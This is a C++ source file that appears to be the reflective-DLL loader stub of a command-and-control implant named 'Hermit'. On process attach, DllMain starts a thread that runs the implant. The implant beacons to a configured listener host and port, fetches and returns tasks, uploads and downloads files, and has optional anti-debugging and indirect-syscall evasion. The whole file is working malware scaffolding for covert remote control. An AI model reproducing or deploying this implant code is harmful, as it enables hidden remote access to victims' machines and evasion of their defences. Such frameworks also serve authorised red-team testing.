#include "hermit.hpp"

#define MAX_THREADS 3

extern HINSTANCE hAppInstance;

DWORD WINAPI ThreadProc(LPVOID lpParam);

DWORD WINAPI ThreadProc(LPVOID lpParam)
{
    Hermit::Run(
        NULL,
        0,
        PAYLOAD_TYPE_W,
        #ifdef PAYLOAD_INDIRECT_SYSCALLS
		TRUE,
		#else
		FALSE,
		#endif
        #ifdef PAYLOAD_ANTI_DEBUG
        TRUE,
        #else
        FALSE,
        #endif
        LISTENER_PROTOCOL_W,
        LISTENER_HOST_W,
        (INTERNET_PORT)LISTENER_PORT,
        REQUEST_PATH_CHECKIN_W,
        REQUEST_PATH_DOWNLOAD_W,
        REQUEST_PATH_TASKGET_W,
        REQUEST_PATH_TASKRESULT_W,
        REQUEST_PATH_UPLOAD_W,
        REQUEST_PATH_WEBSOCKET_W,
        PAYLOAD_SLEEP,
        PAYLOAD_JITTER,
        PAYLOAD_KILLDATE,
        AES_KEY_BASE64_W,
        AES_IV_BASE64_W
    );

    return 0;
}

DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    BOOL bReturnValue = TRUE;

    HANDLE hThread = NULL;

    switch (fdwReason)
    {
        case DLL_QUERY_HMODULE:
            if(lpReserved)
                *(HMODULE*)lpReserved = hAppInstance;
            break;
        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            // MessageBoxA( NULL, "Hello from DllMain!", "Reflective Dll Injection", MB_OK );

            // Execute the Run function within a new thread
            // because WinHTTP functions are not usable in DllMain.
            hThread = CreateThread(
                NULL,
                0,
                ThreadProc,
                hinstDLL,
                0,
                NULL
            );
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return bReturnValue;
}
